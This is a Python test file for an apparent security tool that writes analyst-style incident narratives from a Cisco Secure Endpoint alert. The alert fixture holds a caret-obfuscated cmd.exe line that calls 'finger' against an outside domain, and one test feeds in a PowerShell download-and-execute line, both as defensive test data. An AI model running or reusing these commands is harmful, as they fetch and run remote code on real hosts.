"""Incident-Centric Narrative Engine · regression tests.

Locks in the 2026-08-01 operator directive: the narrative must read
like an MDR analyst report and the subject of every paragraph must be
the incident, endpoint, user, malware, attacker, process chain,
network activity, evidence, threat, or customer impact — NEVER the
tool.
"""
import json
import re

import pytest

from nivxforge.investigation.narrative_lexicon_gate import (
    NarrativeLexiconError, assert_lexicon_clean, find_violations,
)
from nivxforge.investigation.pipeline.narrative_engine import (
    compose_incident_narrative,
)
from nivxforge.investigation.pipeline.orchestrator import run_phase1


# ── The exact operator-provided Cisco Secure Endpoint sample ─────────

WASABISEED_SAMPLE = json.dumps({
    "_time": "2026-07-30T16:30:22.000+00:00",
    "action": "detect",
    "category": "Cloud IOC",
    "command_line_args": (
        "C:\\windows\\system32\\cmd.exe /c s^t^a^r^t  /min for /f delims=@ "
        "%\u0441 in (',f^^i^^n^^g^^e^^r TVJLctGEMd@homesreceplestud.com') do %\u0441"
    ),
    "conn_guid": "79ed08f3-9018-44d5-9f58-254a748e6b86",
    "console_link": "https://console.amp.cisco.com/computers/79ed08f3-9018-44d5-9f58-254a748e6b86/trajectory2",
    "customer": "ccm",
    "date": "2026-07-30 16:23:13 UTC",
    "descr": "Caret characters are often used to obfuscate scripting code",
    "detection": "W32.CaretCommandObfuscation.ioc",
    "event_title": "Suspicious Command Line Activity - W32.CaretCommandObfuscation.ioc",
    "file_disposition": "Clean",
    "file_hash": "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0",
    "file_name": "cmd.exe",
    "file_path": "file:///C%3A/windows/system32/cmd.exe",
    "id": "1161464290877918403",
    "mitre_tactics": ["TA0002 - Execution", "TA0005 - Defense Evasion"],
    "mitre_techniques": [
        "T1027 - Obfuscated Files or Information",
        "T1059 - Command and Scripting Interpreter",
    ],
    "parent_file_hash": "988A56D897915315EEF9CA679B3BC8ADFCECF5E227AEA99AAA1817620520E97E",
    "severity": "Medium",
    "src_data": [{"hostname": ["CCM-MJ0DR5T8"], "ip": ["172.17.60.74"]}],
    "src_host": "CCM-MJ0DR5T8",
    "src_ip": "172.17.60.74",
    "use_case": "mdr_fileless",
    "z_event_id": "36f9a6b004f67a67a1a03f9b67740863",
    "z_product": "Secure Endpoint",
    "containment": "isolated",
})


# ── Vendor detection regression ──────────────────────────────────────

def test_wasabiseed_sample_is_cisco_secure_endpoint():
    """Regression · operator screenshot bug: this Cisco Secure Endpoint
    payload was previously classified as `generic_json`. It must now
    route through the Cisco normalizer at ≥ 0.9 confidence."""
    state = run_phase1(WASABISEED_SAMPLE)
    assert state.vendor.vendor == "cisco_secure_endpoint"
    assert state.vendor.confidence >= 0.9
    assert state.cem.vendor_route == "cisco_secure_endpoint"


def test_wasabiseed_graph_carries_real_endpoint_identity():
    """The graph must name the actual endpoint, IP, detection, and
    hashes — not lose them because the shape didn't match the legacy
    Cisco nested-`computer` variant."""
    state = run_phase1(WASABISEED_SAMPLE)
    hosts = state.graph.nodes_of("host")
    assert any(h.value == "CCM-MJ0DR5T8" for h in hosts)
    assert any((h.attrs or {}).get("ip") == "172.17.60.74" for h in hosts)
    dets = state.graph.nodes_of("detection")
    assert any("W32.CaretCommandObfuscation.ioc" in d.value for d in dets)
    hashes = state.graph.nodes_of("hash")
    assert any(h.value.lower().endswith("088b0") for h in hashes)


# ── Narrative content regression ─────────────────────────────────────

def test_narrative_names_vendor_endpoint_and_detection():
    """The opener sentence must name the vendor, endpoint, IP and
    detection — never say `Generic JSON raised an alert`."""
    state = run_phase1(WASABISEED_SAMPLE)
    narr = compose_incident_narrative(state)
    opener = narr.paragraphs[0]
    assert "Cisco Secure Endpoint" in opener
    assert "CCM-MJ0DR5T8" in opener
    assert "172.17.60.74" in opener
    assert "W32.CaretCommandObfuscation.ioc" in opener
    # The old bug: this must never appear again.
    assert "Generic JSON" not in narr.to_markdown()
    assert "generic_json" not in narr.to_markdown().lower()


def test_narrative_never_contains_forbidden_lexicon():
    """The narrative must never describe X-Lab internals."""
    state = run_phase1(WASABISEED_SAMPLE)
    narr = compose_incident_narrative(state)
    text = narr.to_markdown()
    assert_lexicon_clean(text)
    for forbidden in ("pipeline", "decoder", "verdict engine",
                       "graph builder", "parser", "codec",
                       "the underlying command resolved to",
                       "After removing the layers of obfuscation"):
        assert forbidden.lower() not in text.lower(), (
            f"forbidden phrase '{forbidden}' in narrative:\n{text[:500]}"
        )


def test_narrative_interprets_caret_obfuscation_behaviour():
    """The narrative should observe that caret escapes are being used
    to hide the command — a real analyst signal."""
    state = run_phase1(WASABISEED_SAMPLE)
    narr = compose_incident_narrative(state)
    body = narr.to_markdown().lower()
    assert "caret" in body
    assert "obfuscate" in body or "evade" in body


def test_narrative_reports_isolation_state():
    state = run_phase1(WASABISEED_SAMPLE)
    narr = compose_incident_narrative(state)
    body = narr.to_markdown()
    assert "isolated" in body.lower()


def test_narrative_maps_mitre_tactics_and_techniques():
    state = run_phase1(WASABISEED_SAMPLE)
    narr = compose_incident_narrative(state)
    body = narr.to_markdown()
    assert "T1027" in body
    assert "T1059" in body
    assert "Execution" in body
    assert "Defense Evasion" in body


def test_narrative_emits_actionable_recommendations():
    state = run_phase1(WASABISEED_SAMPLE)
    narr = compose_incident_narrative(state)
    body = narr.to_markdown()
    assert "Recommended follow-up" in body
    # Should reference the observed hash and host
    assert "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0" in body
    assert "CCM-MJ0DR5T8" in body


def test_narrative_never_starts_with_the_pipeline():
    """Subject of every paragraph must be the incident, endpoint, or
    threat — never the tool."""
    state = run_phase1(WASABISEED_SAMPLE)
    narr = compose_incident_narrative(state)
    for p in narr.paragraphs:
        first_sentence = p.split(".", 1)[0].strip().lower()
        bad_subjects = (
            "the pipeline", "the decoder",
            "the parser", "the analysis engine",
            "the summary composer", "the graph builder",
            "the investigation routed", "the decoded output",
            "generic json raised", "the recursive decoder",
        )
        for bad in bad_subjects:
            assert bad not in first_sentence, (
                f"paragraph starts with tool-subject '{bad}':\n{p[:200]}"
            )


def test_narrative_cites_graph_node_ids():
    """Every non-trivial fact must trace to at least one graph node."""
    state = run_phase1(WASABISEED_SAMPLE)
    narr = compose_incident_narrative(state)
    assert narr.evidence_refs, "narrative cited zero graph nodes"
    valid = {n.id for n in state.graph.nodes}
    for nid in narr.evidence_refs:
        assert nid in valid, f"cited node id {nid} not in graph"


# ── Recovered-command preview corruption regression ──────────────────

def test_recovered_command_helper_skips_vendor_canonical_text():
    """Regression · `# vendor=Generic JSON event[0] ts=...` was
    bleeding into the 'recovered command' preview. The helper must
    now skip vendor canonical text."""
    from nivxforge.investigation.analyst_narrative import _recovered_command
    cio = {
        "decode_chain": [
            {"preview": "# vendor=Generic JSON\nevent[0] ts=2026-07-30 path=..."},
            {"preview": "# vendor=Cisco Secure Endpoint event[0] cmd=..."},
        ]
    }
    assert _recovered_command(cio) == ""

    cio2 = {
        "decode_chain": [
            {"preview": "# vendor=Generic JSON event[0]"},
            {"preview": "IEX((New-Object System.Net.WebClient).DownloadString('http://x'))"},
        ]
    }
    assert "IEX" in _recovered_command(cio2)
